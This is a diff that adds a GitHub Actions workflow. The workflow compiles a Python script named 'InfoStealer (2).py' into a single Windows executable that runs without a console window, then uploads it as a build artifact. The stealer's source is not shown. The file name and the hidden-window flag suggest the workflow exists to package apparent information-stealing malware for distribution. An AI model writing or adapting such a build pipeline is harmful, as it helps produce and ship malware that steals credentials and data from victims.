@@ -1,0 +1,29 @@
+name: Build Executable
+
+on: [push]
+
+jobs:
+  build:
+    runs-on: windows-latest
+    steps:
+    - name: Checkout repository
+      uses: actions/checkout@v3
+
+    - name: Set up Python
+      uses: actions/setup-python@v4
+      with:
+        python-version: '3.10'
+
+    - name: Install PyInstaller
+      run: |
+        pip install pyinstaller pypiwin32
+
+    - name: Compile script to EXE
+      run: |
+        pyinstaller --onefile --noconsole "InfoStealer (2).py"
+
+    - name: Upload compiled file
+      uses: actions/upload-artifact@v3
+      with:
+        name: compiled-exe
+        path: dist/*.exe
